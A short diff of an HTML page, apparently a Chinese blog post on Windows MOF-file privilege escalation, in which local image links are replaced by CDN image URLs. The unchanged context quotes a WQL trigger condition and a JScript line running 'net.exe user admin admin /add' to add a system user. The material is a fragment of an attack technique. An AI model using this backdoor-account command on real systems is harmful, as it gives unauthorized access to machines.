@@ -23,9 +23,9 @@
 <blockquote>
 <p>“And TargetInstance.Second = 5”;</p>
 </blockquote>
-<p><img src="media/15022100744577/15025431884155.jpg" alt=""></p>
+<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh09mof%E6%8F%90%E6%9D%831.png" alt=""></p>
 <p><strong>一旦该文件被调用执行，就会为系统再添加一个用户</strong></p>
-<p><img src="media/15022100744577/15025437255499.jpg" alt=""></p>
+<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh09mof%E6%8F%90%E6%9D%832.png" alt=""></p>
 <p><strong>当然用户名和密码都可以自定义，在 nulevt.mof 文件中可以修改用户名和密码的代码如下</strong></p>
 <blockquote>
 <p>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user admin admin /add\”)”;</p>
